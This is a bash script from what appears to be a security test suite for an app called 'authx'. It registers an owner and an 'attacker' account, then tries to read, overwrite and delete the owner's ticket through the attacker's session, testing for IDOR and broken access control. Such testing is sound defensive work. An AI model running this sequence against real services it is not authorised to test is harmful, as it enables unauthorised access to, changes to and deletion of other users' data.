#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../lib/common.sh"

section "05 - IDOR / broken access control on tickets"

owner_email="owner-${RUN_ID}@authx.local"
attacker_email="attacker-${RUN_ID}@authx.local"
password="CurlDemo123!"

owner_jar="$(reset_cookie_jar idor_owner)"
attacker_jar="$(reset_cookie_jar idor_attacker)"

curl_json "05_register_owner" "POST" "/api/auth/register" "$owner_jar" \
  "{\"email\":\"$owner_email\",\"password\":\"$password\"}"
echo

curl_json "05_register_attacker" "POST" "/api/auth/register" "$attacker_jar" \
  "{\"email\":\"$attacker_email\",\"password\":\"$password\"}"
echo

curl_json "05_owner_create_ticket" "POST" "/api/tickets" "$owner_jar" \
  '{"title":"Owner private ticket","description":"Ticket should only be accessible by owner or manager","severity":"HIGH","status":"OPEN"}'
echo

ticket_file="$OUT_DIR/05_owner_create_ticket.http"
ticket_id="$(ticket_id_from_response "$ticket_file")"

if [[ -z "$ticket_id" ]]; then
  echo
  echo "Nu am putut extrage ticket_id din $ticket_file"
  echo
  exit 0
fi

note "Ticket creat de owner: $ticket_id"

curl_json "05_attacker_get_owner_ticket" "GET" "/api/tickets/$ticket_id" "$attacker_jar"
echo

curl_json "05_attacker_update_owner_ticket" "PUT" "/api/tickets/$ticket_id" "$attacker_jar" \
  '{"title":"IDOR overwrite","description":"Attacker modified another user ticket","severity":"CRITICAL","status":"OPEN"}'
echo

curl_json "05_attacker_delete_owner_ticket" "DELETE" "/api/tickets/$ticket_id" "$attacker_jar"
echo